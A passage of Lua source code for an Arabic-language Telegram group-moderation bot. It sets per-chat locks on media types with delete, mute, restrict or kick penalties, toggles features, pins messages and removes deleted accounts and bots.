elseif text == "قفل الفيديو" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Video"..msg.chat_id_,"del")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل الفيديو")  
elseif text == "قفل الفيديو بالتقييد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Video"..msg.chat_id_,"ked")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","✅┇تم قفـل الفيديو")  
elseif text == "قفل الفيديو بالكتم" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Video"..msg.chat_id_,"ktm")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","✅┇تم قفـل الفيديو")  
elseif text == "قفل الفيديو بالطرد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Video"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","✅┇تم قفـل الفيديو")  
elseif text == "فتح الفيديو" and Admin(msg) then
redis:del(bot_id.."Hadaf:Lock:Video"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح الفيديو")  
elseif text == "قفل المتحركه" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Animation"..msg.chat_id_,"del")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل المتحركه")  
elseif text == "قفل المتحركه بالتقييد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Animation"..msg.chat_id_,"ked")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","✅┇تم قفـل المتحركه")  
elseif text == "قفل المتحركه بالكتم" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Animation"..msg.chat_id_,"ktm")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","✅┇تم قفـل المتحركه")  
elseif text == "قفل المتحركه بالطرد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Animation"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","✅┇تم قفـل المتحركه")  
elseif text == "فتح المتحركه" and Admin(msg) then
redis:del(bot_id.."Hadaf:Lock:Animation"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح المتحركه")  
elseif text == "قفل الالعاب" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:geam"..msg.chat_id_,"del")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل الالعاب")  
elseif text == "قفل الالعاب بالتقييد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:geam"..msg.chat_id_,"ked")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","✅┇تم قفـل الالعاب")  
elseif text == "قفل الالعاب بالكتم" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:geam"..msg.chat_id_,"ktm")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","✅┇تم قفـل الالعاب")  
elseif text == "قفل الالعاب بالطرد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:geam"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","✅┇تم قفـل الالعاب")  
elseif text == "فتح الالعاب" and Admin(msg) then
redis:del(bot_id.."Hadaf:Lock:geam"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح الالعاب")  
elseif text == "قفل الصوت" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Audio"..msg.chat_id_,"del")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل الصوت")  
elseif text == "قفل الصوت بالتقييد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Audio"..msg.chat_id_,"ked")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","✅┇تم قفـل الصوت")  
elseif text == "قفل الصوت بالكتم" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Audio"..msg.chat_id_,"ktm")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","✅┇تم قفـل الصوت")  
elseif text == "قفل الصوت بالطرد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Audio"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","✅┇تم قفـل الصوت")  
elseif text == "فتح الصوت" and Admin(msg) then
redis:del(bot_id.."Hadaf:Lock:Audio"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح الصوت")  
elseif text == "قفل الصوت" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:vico"..msg.chat_id_,"del")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل الصوت")  
elseif text == "قفل الصوت بالتقييد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:vico"..msg.chat_id_,"ked")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","✅┇تم قفـل الصوت")  
elseif text == "قفل الصوت بالكتم" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:vico"..msg.chat_id_,"ktm")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","✅┇تم قفـل الصوت")  
elseif text == "قفل الصوت بالطرد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:vico"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","✅┇تم قفـل الصوت")  
elseif text == "فتح الصوت" and Admin(msg) then
redis:del(bot_id.."Hadaf:Lock:vico"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح الصوت")  
elseif text == "قفل الكيبورد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Keyboard"..msg.chat_id_,"del")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل الكيبورد")  
elseif text == "قفل الكيبورد بالتقييد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Keyboard"..msg.chat_id_,"ked")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","✅┇تم قفـل الكيبورد")  
elseif text == "قفل الكيبورد بالكتم" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Keyboard"..msg.chat_id_,"ktm")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","✅┇تم قفـل الكيبورد")  
elseif text == "قفل الكيبورد بالطرد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Keyboard"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","✅┇تم قفـل الكيبورد")  
elseif text == "فتح الكيبورد" and Admin(msg) then
redis:del(bot_id.."Hadaf:Lock:Keyboard"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح الكيبورد")  
elseif text == "قفل الملصقات" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Sticker"..msg.chat_id_,"del")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل الملصقات")  
elseif text == "قفل الملصقات بالتقييد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Sticker"..msg.chat_id_,"ked")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","✅┇تم قفـل الملصقات")  
elseif text == "قفل الملصقات بالكتم" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Sticker"..msg.chat_id_,"ktm")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","✅┇تم قفـل الملصقات")  
elseif text == "قفل الملصقات بالطرد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Sticker"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","✅┇تم قفـل الملصقات")  
elseif text == "فتح الملصقات" and Admin(msg) then
redis:del(bot_id.."Hadaf:Lock:Sticker"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح الملصقات")  
elseif text == "قفل التوجيه" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:forward"..msg.chat_id_,"del")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل التوجيه")  
elseif text == "قفل التوجيه بالتقييد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:forward"..msg.chat_id_,"ked")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","✅┇تم قفـل التوجيه")  
elseif text == "قفل التوجيه بالكتم" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:forward"..msg.chat_id_,"ktm")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","✅┇تم قفـل التوجيه")  
elseif text == "قفل التوجيه بالطرد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:forward"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","✅┇تم قفـل التوجيه")  
elseif text == "فتح التوجيه" and Admin(msg) then
redis:del(bot_id.."Hadaf:Lock:forward"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح التوجيه")  
elseif text == "قفل الملفات" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Document"..msg.chat_id_,"del")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل الملفات")  
elseif text == "قفل الملفات بالتقييد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Document"..msg.chat_id_,"ked")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","✅┇تم قفـل الملفات")  
elseif text == "قفل الملفات بالكتم" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Document"..msg.chat_id_,"ktm")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","✅┇تم قفـل الملفات")  
elseif text == "قفل الملفات بالطرد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Document"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","✅┇تم قفـل الملفات")  
elseif text == "فتح الملفات" and Admin(msg) then
redis:del(bot_id.."Hadaf:Lock:Document"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح الملفات")  
elseif text == "قفل السيلفي" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Unsupported"..msg.chat_id_,"del")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل السيلفي")  
elseif text == "قفل السيلفي بالتقييد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Unsupported"..msg.chat_id_,"ked")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","✅┇تم قفـل السيلفي")  
elseif text == "قفل السيلفي بالكتم" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Unsupported"..msg.chat_id_,"ktm")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","✅┇تم قفـل السيلفي")  
elseif text == "قفل السيلفي بالطرد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Unsupported"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","✅┇تم قفـل السيلفي")  
elseif text == "فتح السيلفي" and Admin(msg) then
redis:del(bot_id.."Hadaf:Lock:Unsupported"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح السيلفي")  
elseif text == "قفل الماركداون" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Markdaun"..msg.chat_id_,"del")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل الماركداون")  
elseif text == "قفل الماركداون بالتقييد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Markdaun"..msg.chat_id_,"ked")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","✅┇تم قفـل الماركداون")  
elseif text == "قفل الماركداون بالكتم" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Markdaun"..msg.chat_id_,"ktm")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","✅┇تم قفـل الماركداون")  
elseif text == "قفل الماركداون بالطرد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Markdaun"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","✅┇تم قفـل الماركداون")  
elseif text == "فتح الماركداون" and Admin(msg) then
redis:del(bot_id.."Hadaf:Lock:Markdaun"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح الماركداون")  
elseif text == "قفل الجهات" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Contact"..msg.chat_id_,"del")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل الجهات")  
elseif text == "قفل الجهات بالتقييد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Contact"..msg.chat_id_,"ked")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","✅┇تم قفـل الجهات")  
elseif text == "قفل الجهات بالكتم" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Contact"..msg.chat_id_,"ktm")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","✅┇تم قفـل الجهات")  
elseif text == "قفل الجهات بالطرد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Contact"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","✅┇تم قفـل الجهات")  
elseif text == "فتح الجهات" and Admin(msg) then
redis:del(bot_id.."Hadaf:Lock:Contact"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح الجهات")  
elseif text == "قفل الكلايش" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Spam"..msg.chat_id_,"del")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل الكلايش")  
elseif text == "قفل الكلايش بالتقييد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Spam"..msg.chat_id_,"ked")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","✅┇تم قفـل الكلايش")  
elseif text == "قفل الكلايش بالكتم" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Spam"..msg.chat_id_,"ktm")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","✅┇تم قفـل الكلايش")  
elseif text == "قفل الكلايش بالطرد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Spam"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","✅┇تم قفـل الكلايش")  
elseif text == "فتح الكلايش" and Admin(msg) then
redis:del(bot_id.."Hadaf:Lock:Spam"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح الكلايش")  
elseif text == "قفل الانلاين" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Inlen"..msg.chat_id_,"del")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل الانلاين")  
elseif text == "قفل الانلاين بالتقييد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Inlen"..msg.chat_id_,"ked")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","✅┇تم قفـل الانلاين")  
elseif text == "قفل الانلاين بالكتم" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Inlen"..msg.chat_id_,"ktm")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","✅┇تم قفـل الانلاين")  
elseif text == "قفل الانلاين بالطرد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Inlen"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","✅┇تم قفـل الانلاين")  
elseif text == "فتح الانلاين" and Admin(msg) then
redis:del(bot_id.."Hadaf:Lock:Inlen"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح الانلاين")  
elseif text == "قفل التكرار بالطرد" and Admin(msg) then 
redis:hset(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","✅┇تم قفل التكرار")
elseif text == "قفل التكرار" and Admin(msg) then 
redis:hset(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفل التكرار بالحذف")
elseif text == "قفل التكرار بالتقييد" and Admin(msg) then 
redis:hset(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","✅┇تم قفل التكرار")
elseif text == "قفل التكرار بالكتم" and Admin(msg) then 
redis:hset(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","✅┇تم قفل التكرار")
elseif text == "فتح التكرار" and Admin(msg) then 
redis:hdel(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح التكرار")
elseif text == "تفعيل جلب الرابط" and Admin(msg) or text == 'تفعيل الرابط' and Admin(msg) then  
redis:set(bot_id.."Hadaf:Link_Group"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,"✅┇تم تفعيل جلب الرابط المجموعه") 
elseif text == "تعطيل جلب الرابط" and Admin(msg) or text == 'تعطيل الرابط' and Admin(msg) then
redis:del(bot_id.."Hadaf:Link_Group"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"✅┇تم تعطيل جلب رابط المجموعه") 
elseif text == "تفعيل الترحيب" and Admin(msg) then  
redis:set(bot_id.."Hadaf:Chek:Welcome"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,"✅┇تم تفعيل ترحيب المجموعه") 
elseif text == "تعطيل الترحيب" and Admin(msg) then  
redis:del(bot_id.."Hadaf:Chek:Welcome"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"✅┇تم تعطيل ترحيب المجموعه") 
elseif text == "تفعيل الردود" and Owner(msg) then   
redis:del(bot_id.."Hadaf:Reply:Manager"..msg.chat_id_)  
send(msg.chat_id_, msg.id_,"✅┇تم تفعيل الردود") 
elseif text == "تعطيل الردود" and Owner(msg) then  
redis:set(bot_id.."Hadaf:Reply:Manager"..msg.chat_id_,true)  
send(msg.chat_id_, msg.id_,"✅┇تم تعطيل الردود" ) 
elseif text == "تفعيل ردود العام" and Owner(msg) then   
redis:del(bot_id.."Hadaf:Reply:Sudo"..msg.chat_id_)  
send(msg.chat_id_, msg.id_,"✅┇تم تفعيل ردود العام" ) 
elseif text == "تعطيل ردود العام" and Owner(msg) then  
redis:set(bot_id.."Hadaf:Reply:Sudo"..msg.chat_id_,true)   
send(msg.chat_id_, msg.id_,"✅┇تم تعطيل ردود العام" ) 
elseif text == "تفعيل اطردني" and Owner(msg) then   
redis:del(bot_id.."Hadaf:Cheking:Kick:Me:Group"..msg.chat_id_)  
send(msg.chat_id_, msg.id_,Text) 
elseif text == "تعطيل اطردني" and Owner(msg) then  
redis:set(bot_id.."Hadaf:Cheking:Kick:Me:Group"..msg.chat_id_,true)  
send(msg.chat_id_, msg.id_,"✅┇تم تعطيل امر اطردني") 
elseif text == "تفعيل المغادره" and Dev_Hadaf(msg) then   
redis:del(bot_id.."Hadaf:Lock:Left"..msg.chat_id_)  
send(msg.chat_id_, msg.id_,"✅┇تم تفعيل مغادرة البوت") 
elseif text == "تعطيل المغادره" and Dev_Hadaf(msg) then  
redis:set(bot_id.."Hadaf:Lock:Left"..msg.chat_id_,true)   
send(msg.chat_id_, msg.id_, "✅┇تم تعطيل مغادرة البوت") 
elseif text == "تفعيل الاذاعه" and Dev_Hadaf(msg) then  
redis:del(bot_id.."Hadaf:Broadcasting:Bot") 
send(msg.chat_id_, msg.id_,"✅┇تم تفعيل الاذاعه \n⚠️️┇الان يمكن للمطورين الاذاعه" ) 
elseif text == "تعطيل الاذاعه" and Dev_Hadaf(msg) then  
redis:set(bot_id.."Hadaf:Broadcasting:Bot",true) 
send(msg.chat_id_, msg.id_,"✅┇تم تعطيل الاذاعه") 
elseif text == "تعطيل اوامر التحشيش" and Owner(msg) then    
send(msg.chat_id_, msg.id_, '✅┇تم تعطيل اوامر التحشيش')
redis:set(bot_id.."Hadaf:Fun:Group"..msg.chat_id_,"true")
elseif text == "تفعيل اوامر التحشيش" and Owner(msg) then    
send(msg.chat_id_, msg.id_,'✅┇تم تفعيل اوامر التحشيش')
redis:del(bot_id.."Hadaf:Fun:Group"..msg.chat_id_)
elseif text == 'تفعيل الايدي' and Owner(msg) then   
redis:del(bot_id..'Hadaf:Lock:Id:Photo'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'✅┇تم تفعيل الايدي') 
elseif text == 'تعطيل الايدي' and Owner(msg) then  
redis:set(bot_id..'Hadaf:Lock:Id:Photo'..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,'✅┇تم تعطيل الايدي') 
elseif text == 'تفعيل الايدي بالصوره' and Owner(msg) then   
redis:del(bot_id..'Hadaf:Lock:Id:Py:Photo'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'✅┇تم تفعيل الايدي بالصوره') 
elseif text == 'تعطيل الايدي بالصوره' and Owner(msg) then  
redis:set(bot_id..'Hadaf:Lock:Id:Py:Photo'..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,'✅┇تم تعطيل الايدي بالصوره') 
elseif text == "تعطيل الالعاب" and Owner(msg) then   
redis:del(bot_id.."Hadaf:Lock:Game:Group"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"✅┇تم تعطيل الالعاب") 
elseif text == "تفعيل الالعاب" and Owner(msg) then  
redis:set(bot_id.."Hadaf:Lock:Game:Group"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,"✅┇تم تفعيل الالعاب") 
elseif text == 'تفعيل البوت الخدمي' and Dev_Hadaf(msg) then  
redis:del(bot_id..'Hadaf:Free:Bot') 
send(msg.chat_id_, msg.id_,'✅┇تم تفعيل البوت الخدمي \n⚡┇الان يمكن الجميع تفعيله') 
elseif text == 'تعطيل البوت الخدمي' and Dev_Hadaf(msg) then  
redis:set(bot_id..'Hadaf:Free:Bot',true) 
send(msg.chat_id_, msg.id_,'✅┇تم تعطيل البوت الخدمي') 
elseif text == "تعطيل الطرد" and Constructor(msg) or text == "تعطيل الحظر" and Constructor(msg) then
redis:set(bot_id.."Hadaf:Lock:Ban:Group"..msg.chat_id_,"true")
send(msg.chat_id_, msg.id_, '✅┇تم تعطيل - ( الحظر - الطرد ) ')
elseif text == "تفعيل الطرد" and Constructor(msg) or text == "تفعيل الحظر" and Constructor(msg) then
redis:del(bot_id.."Hadaf:Lock:Ban:Group"..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✅┇تم تفعيل - ( الحظر - الطرد ) ')
elseif text == "تعطيل الرفع" and Constructor(msg) or text == "تعطيل الترقيه" and Constructor(msg) then
redis:set(bot_id.."Hadaf:Cheking:Seted"..msg.chat_id_,"true")
send(msg.chat_id_, msg.id_, '✅┇تم تعطيل رفع - ( الادمن - المميز ) ')
elseif text == "تفعيل الرفع" and Constructor(msg) or text == "تفعيل الترقيه" and Constructor(msg) then
redis:del(bot_id.."Hadaf:Cheking:Seted"..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✅┇تم تفعيل رفع - ( الادمن - المميز ) ')
elseif text ==("تثبيت") and msg.reply_to_message_id_ ~= 0 and Admin(msg) then
  
if redis:sismember(bot_id.."Hadaf:Lock:pin",msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_,"⚠️┇التثبيت مقفل من قبل المنشئين")  
return false end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100",""),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"✅┇تم تثبيت الرساله بنجاح")   
redis:set(bot_id.."Hadaf:Get:Id:Msg:Pin"..msg.chat_id_,msg.reply_to_message_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_,"⚠️┇البوت ليس ادمن هنا")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"⚠️┇ليست لدي صلاحية التثبيت .")  
end;end,nil) 
elseif text == "الغاء التثبيت" and Admin(msg) then
  
if redis:sismember(bot_id.."Hadaf:Lock:pin",msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_,"⚠️┇التثبيت مقفل من قبل المنشئين")  
return false end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"✅┇تم الغاء تثبيت الرساله بنجاح")   
redis:del(bot_id.."Hadaf:Get:Id:Msg:Pin"..msg.chat_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_,"⚠️┇البوت ليس ادمن هنا")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"⚠️┇ليست لدي صلاحية التثبيت .")
end;end,nil)
elseif text == 'طرد المحذوفين' or text == 'مسح المحذوفين' then  
if Admin(msg) then    
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
KickGroup(msg.chat_id_, data.id_)
end;end,nil);end
send(msg.chat_id_, msg.id_,'✅┇تم طرد الحسابات المحذوفه')
end,nil)
end
elseif text ==("مسح المطرودين") and Admin(msg) then    
local function delbans(extra, result)  
if not msg.can_be_deleted_ == true then  
send(msg.chat_id_, msg.id_, "⚠️┇ يرجى ترقيتي ادمن هنا") 
return false
end  
local num = 0 
for k,y in pairs(result.members_) do 
num = num + 1  
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = y.user_id_, status_ = { ID = "ChatMemberStatusLeft"}, }, dl_cb, nil)  
end  
send(msg.chat_id_, msg.id_,"✅┇ تم الغاء الحظر عن *: "..num.." * شخص") 
end    
elseif text == "مسح البوتات" and Admin(msg) then 
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah)  
local admins = tah.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if tah.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(bot_id) then
KickGroup(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
send(msg.chat_id_, msg.id_, "⚠️┇لا توجد بوتات في المجموعه")
else
send(msg.chat_id_, msg.id_,"\n⛔┇عدد البوتات هنا : "..c.."\n👮┇عدد البوتات التي هي ادمن : "..x.."\n🚷┇تم طرد - "..(c - x).." - بوتات ") 
end 
end,nil)  
elseif text == "مسح الرابط" and Admin(msg) or text == "حذف الرابط" and Admin(msg) then
send(msg.chat_id_,msg.id_,"✅┇تم ازالة رابط المجموعه")           
redis:del(bot_id.."Hadaf:link:set:Group"..msg.chat_id_) 
elseif text == "حذف الصوره" and Admin(msg) or text == "مسح الصوره" and Admin(msg) then 
https.request("https://api.telegram.org/bot"..token.."/deleteChatPhoto?chat_id="..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"✅┇تم ازالة صورة المجموعه") 
elseif text == "مسح الترحيب" and Admin(msg) or text == "حذف الترحيب" and Admin(msg) then 
redis:del(bot_id.."Hadaf:Get:Welcome:Group"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"✅┇تم ازالة ترحيب المجموعه") 
elseif text == "مسح القوانين" and Admin(msg) or text == "حذف القوانين" and Admin(msg) then  
send(msg.chat_id_, msg.id_,"⚠️️┇تم ازالة قوانين المجموعه")  
redis:del(bot_id.."Hadaf::Rules:Group"..msg.chat_id_) 
elseif text == 'حذف الايدي' and Owner(msg) or text == 'مسح الايدي' and Owner(msg) then
redis:del(bot_id.."Hadaf:Set:Id:Group"..msg.chat_id_)
send(msg.chat_id_, msg.id_, '⚡┇تم ازالة كليشة الايدي ')
elseif text == 'مسح رسائلي' then
redis:del(bot_id..'Hadaf:Num:Message:User'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_, msg.id_,'✅┇تم مسح جميع رسائلك ') 
elseif text == 'مسح تعديلاتي' or text == 'مسح تعديلاتي' then
redis:del(bot_id..'Hadaf:Num:Message:Edit'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_, msg.id_,'✅┇تم مسح جميع تعديلاتك ') 
elseif text == 'مسح جهاتي' then
redis:del(bot_id..'Hadaf:Num:Add:Memp'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_, msg.id_,'✅┇تم مسح جميع جهاتك المضافه ') 
elseif text ==("مسح") and Admin(msg) and tonumber(msg.reply_to_message_id_) > 0 then
Delete_Message(msg.chat_id_,{[0] = tonumber(msg.reply_to_message_id_),msg.id_})   
tdcli_function({ID="GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersKicked"},offset_ = 0,limit_ = 200}, delbans, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_})    
